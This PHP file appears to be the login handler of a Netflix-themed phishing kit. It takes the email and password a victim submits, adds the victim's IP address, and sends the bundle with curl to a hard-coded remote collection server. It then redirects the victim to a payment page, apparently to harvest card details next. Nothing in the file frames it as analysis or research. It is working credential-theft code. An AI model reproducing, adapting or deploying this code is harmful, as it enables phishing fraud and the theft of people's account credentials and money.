<?php
session_start();
include('functions.php');
$ip = get_client_ip();
$hash = md5($ip);
if(@$_SESSION['logged'] == true) {
        header("Location: payment.php" . getUrlHash($hash));
}

$user=$_REQUEST['email'];
$pass=$_REQUEST['password'];

$user= str_replace(' ', '', $user);
$agent = getenv("HTTP_USER_AGENT");
if(strlen($user) < 4) { header("Location: index.php" . getUrlHash($hash));exit();}
if(strlen($pass) < 3) { header("Location: index.php" . getUrlHash($hash));exit();}
$data=($user." ".$pass." ".$ip."\n");
$data=urlencode($data);

$ch = curl_init("http://45.148.10.177/.tw/dot.php");
curl_setopt($ch, CURLOPT_POST      ,1);
curl_setopt($ch, CURLOPT_POSTFIELDS    ,"FU=netflix-email&DATA=$data");
curl_setopt($ch, CURLOPT_HEADER      ,0);  // DO NOT RETURN HTTP HEADERS
curl_setopt($ch, CURLOPT_RETURNTRANSFER  ,1);  // RETURN THE CONTENTS OF THE CALL
$Rec_Data = curl_exec($ch);

@$_SESSION['logged'] = true;

header("Location: payment.php" . getUrlHash($hash));
?>
